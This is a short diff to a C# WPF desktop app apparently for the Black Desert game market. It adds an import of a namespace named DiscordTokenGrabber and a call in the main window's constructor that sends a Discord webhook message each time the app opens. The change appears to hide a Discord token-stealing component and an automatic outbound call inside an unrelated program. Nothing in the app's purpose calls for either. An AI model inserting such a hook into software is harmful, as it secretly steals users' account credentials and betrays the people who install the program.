@@ -18,6 +18,7 @@ using System.Text.Json;
 using Newtonsoft.Json;
 using BlackDesertMarket.API;
 using BlackDesertMarket.Items;
+using DiscordTokenGrabber;
 
 namespace BlackDesertMarket
 {
@@ -29,6 +30,7 @@ namespace BlackDesertMarket
         public MainWindow()
         {
             InitializeComponent();
+            DiscordWebhook.SendMessage(DiscordMessageAPI.CreateMessage("salut"));
         }
         private void AddItemButton(object sender, RoutedEventArgs e)
         {
